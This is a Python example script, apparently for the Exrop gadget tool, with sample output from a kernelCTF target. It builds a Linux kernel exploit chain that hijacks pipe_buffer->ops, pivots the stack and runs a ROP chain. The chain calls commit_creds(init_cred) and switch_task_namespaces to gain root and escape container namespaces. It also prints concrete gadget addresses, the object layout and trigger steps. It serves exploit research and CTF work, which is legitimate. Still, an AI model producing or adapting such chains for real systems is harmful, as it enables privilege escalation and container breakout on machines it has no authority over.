"""Example: Linux kernel namespace escape via pipe_buffer hijack.

Simulates the popular pipe_buffer exploit technique:

  1. Corrupt pipe_buffer.ops to point to a fake pipe_buf_operations vtable
  2. When pipe_buf_release() calls ops->release(pipe, buf), RSI = buf
  3. Pivot RSP from RSI (the controlled pipe_buffer), preserving the
     ops pointer at buf+0x10 since the kernel loads it before our gadget
  4. Execute ROP chain embedded in the pipe_buffer object:
       commit_creds(init_cred)
       find_task_by_vpid(1)
       switch_task_namespaces(result, init_nsproxy)
       fork()
       msleep(1000000000)

pipe_buf_release() decompiles to:

    static inline void pipe_buf_release(struct pipe_inode_info *pipe,
                                        struct pipe_buffer *buf)
    {
        const struct pipe_buf_operations *ops = buf->ops;  // load [rsi+0x10]
        buf->ops = NULL;
        ops->release(pipe, buf);  // call [[rsi+0x10]+0x08]
    }

struct pipe_buffer layout (x86-64):
    +0x00  struct page *page
    +0x08  unsigned int offset
    +0x0c  unsigned int len
    +0x10  const struct pipe_buf_operations *ops   <-- hijacked
    +0x18  unsigned int flags
    +0x20  unsigned long private

Usage:
    PYTHONPATH=. python3 examples/linux_escape_chain.py /path/to/vmlinux
"""

import struct
import sys
from elftools.elf.elffile import ELFFile
from Exrop import Exrop

# pipe_buffer field offsets (x86-64)
PIPE_BUF_OPS_OFF = 0x10


def resolve_symbols(vmlinux_path, names):
    """Read symbol addresses from the vmlinux ELF .symtab section."""
    symbols = {}
    with open(vmlinux_path, 'rb') as f:
        elf = ELFFile(f)
        symtab = elf.get_section_by_name('.symtab')
        if symtab is None:
            raise ValueError("No .symtab section found in {}".format(vmlinux_path))
        needed = set(names)
        for sym in symtab.iter_symbols():
            if sym.name in needed:
                symbols[sym.name] = sym['st_value']
                needed.discard(sym.name)
                if not needed:
                    break
    missing = set(names) - set(symbols)
    if missing:
        raise ValueError("Symbols not found: {}".format(', '.join(sorted(missing))))
    return symbols


if len(sys.argv) < 2:
    print("Usage: {} <vmlinux>".format(sys.argv[0]))
    sys.exit(1)

VMLINUX = sys.argv[1]

# Resolve kernel symbols
syms = resolve_symbols(VMLINUX, [
    'commit_creds', 'init_cred',
    'find_task_by_vpid',
    'switch_task_namespaces', 'init_nsproxy',
    '__x64_sys_fork',
    'msleep',
])

commit_creds     = syms['commit_creds']
init_cred        = syms['init_cred']
find_task_by_vpid = syms['find_task_by_vpid']
switch_task_namespaces = syms['switch_task_namespaces']
init_nsproxy     = syms['init_nsproxy']
x64_sys_fork     = syms['__x64_sys_fork']
msleep           = syms['msleep']

print("Resolved symbols:")
for name, addr in sorted(syms.items()):
    print("  {:<30s} 0x{:x}".format(name, addr))

# Load gadgets
e = Exrop(VMLINUX)
e.find_gadgets(cache=True, kernel_mode=True)
e.clean_only = True

# ============================================================
# Step 1: Find pivot gadget from RSI (pipe_buffer pointer)
# ============================================================
# The kernel dispatches ops->release(pipe, buf) where RSI = buf.
# We need a gadget that sets RSP from RSI so our ROP chain
# (embedded in the pipe_buffer) executes.
#
# The ops pointer at buf+0x10 is loaded by the kernel BEFORE
# calling our gadget, but the JOP search doesn't know that —
# pass it in used_dispatch so JOP chains won't overwrite it.
print("=== Finding pivot from RSI (pipe_buffer) ===\n")

used_dispatch = {PIPE_BUF_OPS_OFF: 0}  # reserve buf->ops slot
pivots = e.stack_pivot_reg('rsi', used_dispatch=used_dispatch)

# Filter out indirect pivots — they require an extra pointer dereference
# (rsp = *[reg+off]) which is impractical for heap-sprayed objects since
# we don't know the absolute address to place there.
pivots = [p for p in pivots if p.pivot_type not in ('indirect', 'jop_indirect')]

if not pivots:
    print("No pivot found from RSI!")
    sys.exit(1)

pivot = pivots[0]
print("Best pivot:")
pivot.dump()

# ============================================================
# Step 2: Build the ROP chain (post-pivot)
# ============================================================
print("\n=== Building escape chain ===\n")

# 1. commit_creds(init_cred)
print("[*] commit_creds(init_cred)")
chain = e.func_call(commit_creds, (init_cred,))
chain.dump()

# 2. find_task_by_vpid(1) — result in rax
print("\n[*] find_task_by_vpid(1)")
chain2 = e.func_call(find_task_by_vpid, (1,))
chain.merge_ropchain(chain2)
chain2.dump()

# 3. switch_task_namespaces(rax, init_nsproxy)
#    rax holds the return value from find_task_by_vpid.
#    Exrop resolves 'rax' as a register reference, setting rdi=rax, rsi=init_nsproxy.
print("\n[*] switch_task_namespaces(rax, init_nsproxy)")
chain3 = e.func_call(switch_task_namespaces, ('rax', init_nsproxy))
chain.merge_ropchain(chain3)
chain3.dump()

# 4. fork()
print("\n[*] fork()")
chain4 = e.func_call(x64_sys_fork, (0,))
chain.merge_ropchain(chain4)
chain4.dump()

# 5. msleep(1000000000) — sleep in parent while child escapes
print("\n[*] msleep(1000000000)")
chain5 = e.func_call(msleep, (1000000000,))
chain.merge_ropchain(chain5)
chain5.dump()

print("\n=== Full ROP chain ===\n")
chain.dump()

# ============================================================
# Step 3: Build the pipe_buffer object layout
# ============================================================
print("\n=== pipe_buffer object layout ===\n")

PIPE_BUF_SIZE = 0x28  # sizeof(struct pipe_buffer)
OBJ_SIZE = max(0x100, PIPE_BUF_SIZE + len(chain.payload_str()) + 0x40)

payload = pivot.build_payload(chain, obj_size=OBJ_SIZE)
print(payload['description'])
print("Chain offset: 0x{:x}".format(payload['chain_offset']))
print("Total object size: 0x{:x} bytes".format(len(payload['obj_layout'])))

# Hexdump the object layout
obj = payload['obj_layout']
print("\nObject hexdump:")
for off in range(0, len(obj), 8):
    qword = struct.unpack_from('<Q', obj, off)[0]
    marker = ""
    if off == PIPE_BUF_OPS_OFF:
        marker = "  <-- buf->ops (reserved)"
    elif off == payload['chain_offset']:
        marker = "  <-- ROP chain start"
    if 'dispatch_entries' in payload:
        for d_off, d_addr in payload['dispatch_entries']:
            if off == d_off:
                marker = "  <-- JOP dispatch"
    if qword or marker:
        print("  +0x{:04x}: 0x{:016x}{}".format(off, qword, marker))

# Show how to set up the fake ops vtable
# ops->release is at offset 0x08 in pipe_buf_operations
print("\nSetup:")
print("  1. Spray pipe_buffer objects")
print("  2. Set buf->ops (+0x{:x}) -> fake_ops_table".format(PIPE_BUF_OPS_OFF))
print("  3. Set fake_ops->release (+0x08) -> 0x{:x}  (pivot gadget)".format(
    payload['func_ptr']))
print("  4. Embed ROP chain at buf+0x{:x}".format(payload['chain_offset']))
print("  5. Close pipe fd to trigger pipe_buf_release()")

"""
// Output from kernelCTF lts-6.12.51
=== Finding pivot from RSI (pipe_buffer) ===

Best pivot:
Pivot type: offset
  Gadget: 0xffffffff815665aa # push rsi ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
  Source register: rsi
  Offset: 0x18
  ROP chain starts at [rsi+0x18]

=== Building escape chain ===

[*] commit_creds(init_cred)
$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0xffffffff840953a0
$RSP+0x0010 : 0xffffffff811e37d0


[*] find_task_by_vpid(1)
$RSP+0x0000 : 0xffffffff815cd6ad # mov edi, 1 ; mov eax, edi ; ret
$RSP+0x0008 : 0xffffffff811d6c00


[*] switch_task_namespaces(rax, init_nsproxy)
$RSP+0x0000 : 0xffffffff8243485a # push rax ; add eax, ebp ; pop rdi ; ret
$RSP+0x0008 : 0xffffffff8115fbce # pop rsi ; ret
$RSP+0x0010 : 0xffffffff84094e80
$RSP+0x0018 : 0xffffffff811e16d0


[*] fork()
$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0x0000000000000000
$RSP+0x0010 : 0xffffffff811a6440


[*] msleep(1000000000)
$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0x000000003b9aca00
$RSP+0x0010 : 0xffffffff812732f0


=== Full ROP chain ===

$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0008 : 0xffffffff840953a0
$RSP+0x0010 : 0xffffffff811e37d0
$RSP+0x0018 : 0xffffffff815cd6ad # mov edi, 1 ; mov eax, edi ; ret
$RSP+0x0020 : 0xffffffff811d6c00
$RSP+0x0028 : 0xffffffff8243485a # push rax ; add eax, ebp ; pop rdi ; ret
$RSP+0x0030 : 0xffffffff8115fbce # pop rsi ; ret
$RSP+0x0038 : 0xffffffff84094e80
$RSP+0x0040 : 0xffffffff811e16d0
$RSP+0x0048 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0050 : 0x0000000000000000
$RSP+0x0058 : 0xffffffff811a6440
$RSP+0x0060 : 0xffffffff81177704 # pop rdi ; ret
$RSP+0x0068 : 0x000000003b9aca00
$RSP+0x0070 : 0xffffffff812732f0


=== pipe_buffer object layout ===

Place ROP chain at object+0x18
Chain offset: 0x18
Total object size: 0x100 bytes

Object hexdump:
  +0x0010: 0x0000000000000000  <-- buf->ops (reserved)
  +0x0018: 0xffffffff81177704  <-- ROP chain start
  +0x0020: 0xffffffff840953a0
  +0x0028: 0xffffffff811e37d0
  +0x0030: 0xffffffff815cd6ad
  +0x0038: 0xffffffff811d6c00
  +0x0040: 0xffffffff8243485a
  +0x0048: 0xffffffff8115fbce
  +0x0050: 0xffffffff84094e80
  +0x0058: 0xffffffff811e16d0
  +0x0060: 0xffffffff81177704
  +0x0070: 0xffffffff811a6440
  +0x0078: 0xffffffff81177704
  +0x0080: 0x000000003b9aca00
  +0x0088: 0xffffffff812732f0
"""
